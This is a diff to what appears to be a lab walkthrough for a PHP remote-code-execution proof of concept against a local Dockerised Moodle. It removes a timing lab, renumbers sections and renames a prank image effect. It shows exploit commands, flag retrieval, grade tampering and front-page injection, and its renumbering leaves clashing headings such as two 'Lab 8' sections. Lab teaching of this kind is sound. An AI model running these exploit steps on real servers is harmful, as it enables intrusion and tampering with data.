@@ -246,40 +246,7 @@ The `-c` argument accepts at most **14 bytes**. Later Labs will use short comman
 
 ---
 
-## 3. Lab 3: Verify execution through timing
-
-If the target executes `sleep 5`, the request should take longer than a normal request.
-
-Measure the baseline:
-
-```sh
-time curl -s -o /dev/null http://127.0.0.1:8080/index.php
-```
-
-Then run the PoC:
-
-```sh
-printf 'sleep 5; echo ok > /loot/p1\n' > loot/c
-
-time python3 php2shell/exploit.py \
-  -u http://127.0.0.1:8080/index.php \
-  --profile official83 \
-  --docker-container "$CONTAINER" \
-  --proof-file loot/p1 \
-  -c 'sh</loot/c'
-```
-
-Expected: stage 1 and 2 addresses, a noticeable delay, and:
-
-```text
-PROOF: ok
-```
-
-The delay supports that `sleep` ran, while the proof confirms the expected file was written. Total execution time may exceed five seconds because of retries.
-
----
-
-## 4. Lab 4: Identify the execution user
+## 3. Lab 3: Identify the execution user
 
 Run `id` to see which account executes the command:
 
@@ -306,9 +273,9 @@ The command executed as the container's web-server user, `www-data`. This is not
 
 ---
 
-## 5. Lab 5: Retrieve the Flag
+## 4. Lab 4: Retrieve the Flag
 
-### 5.1 Understand the 14-byte limit
+### 4.1 Understand the 14-byte limit
 
 The PoC's `-c` accepts at most **14 UTF-8 bytes**, but:
 
@@ -336,7 +303,7 @@ The commands use:
 
 The Apache worker's working directory is `/var/www/html`.
 
-### 5.2 Build the script
+### 4.2 Build the script
 
 Define a helper:
 
@@ -395,7 +362,7 @@ cat *>/var/www/html/p
 
 Since `/x` persists between requests, fetching it does not always prove that the latest attempt succeeded. Check that its contents progressed as expected.
 
-### 5.3 Execute and retrieve the Flag
+### 4.3 Execute and retrieve the Flag
 
 ```sh
 python3 php2shell/exploit.py \
@@ -419,7 +386,7 @@ The HTTP request should return the same Flag.
 
 The script was assembled through multiple RCE commands rather than copied from the Host.
 
-### 5.4 Clean up
+### 4.4 Clean up
 
 Save your evidence, then remove the temporary files:
 
@@ -434,7 +401,7 @@ Using `docker compose exec` for cleanup is fine, but directly reading the Flag w
 
 ---
 
-## 6–8. Modify Moodle test data
+## 5. Modify Moodle test data
 
 Now that we have confirmed RCE as `www-data`, we will demonstrate three effects on fictional Moodle data.
 
@@ -579,20 +546,20 @@ The grade returns to `30.00`. The course, grade item, and student remain intact.
 
 ---
 
-## 8. Lab 8: Add a Rickroll image
+## 8. Lab 8: Add a good-hacker image
 
 This effect adds a clickable image near the top of Moodle's front page. Clicking it opens a YouTube video in a new tab; it does not redirect the entire site.
 
 Run:
 
 ```sh
-run_effect rickroll
+run_effect good-hacker
 ```
 
 Expected:
 
 ```text
-rickroll=ok image=https://s.xn--kst.tw/good-hacker.webp link=youtube db=verified
+good-hacker=ok image=https://s.xn--kst.tw/good-hacker.webp link=youtube db=verified
 ```
 
 Verify:
@@ -609,7 +576,7 @@ The image is loaded externally, so displaying it requires network access.
 Reset:
 
 ```sh
-run_effect reset-rickroll
+run_effect reset-good-hacker
 
 curl -s http://127.0.0.1:8080/ |
   grep -o 'good-hacker.webp' || echo image-link-absent
@@ -618,7 +585,7 @@ curl -s http://127.0.0.1:8080/ |
 Expected:
 
 ```text
-rickroll-reset=ok image=absent link=absent top=restored db=verified
+good-hacker-reset=ok image=absent link=absent top=restored db=verified
 image-link-absent
 ```
 
@@ -637,7 +604,7 @@ The reset restores the previous `additionalhtmltopofbody` content without changi
 | Test student | `p2s_student` / `StudentOnly-2026` |
 | Course | `作業系統` (`OS`) |
 | Grade | `Midterm = 30.00` |
-| Rickroll image | Absent |
+| Good-hacker image | Absent |
 | Public artifacts | No `impact.txt`, `grade-demo.txt`, or `/p` |
 | Flag | `/opt/lab/flag.txt`, outside the Web Root |
 | PHP | 8.3.35 (vulnerable), 8.3.36 (patched) |
@@ -699,7 +666,7 @@ This removes the Lab's fixed temporary files, including `/x`, `/p`, `impact.txt`
 
 ---
 
-## 10. Lab 9: Compare vulnerable and patched PHP
+## 10. Lab 8: Compare vulnerable and patched PHP
 
 We will now update PHP from 8.3.35 to 8.3.36 and repeat the same PoC test.
 
@@ -830,7 +797,7 @@ For installation and platform issues, see [README Troubleshooting](../../README.
 | Repeated redirect to `install.php` | Initialization logs, permissions, and symlinks |
 | `EXPLOIT_FAILED` with an existing proof | Remove stale proof; check working directory and path |
 | Grade does not reach `grade-state=complete` | Inspect `loot/grade-progress.txt` |
-| Site title remains `PWNED` after Rickroll reset | Run Homepage reset separately |
+| Site title remains `PWNED` after good-hacker reset | Run Homepage reset separately |
 | Repeated `heap leak missed` | PHP version, ini settings, worker count, target URL |
 | Cannot write to `/loot` | Mount permissions; restart if necessary |
 | Database connection failure | Database container and persistent configuration |
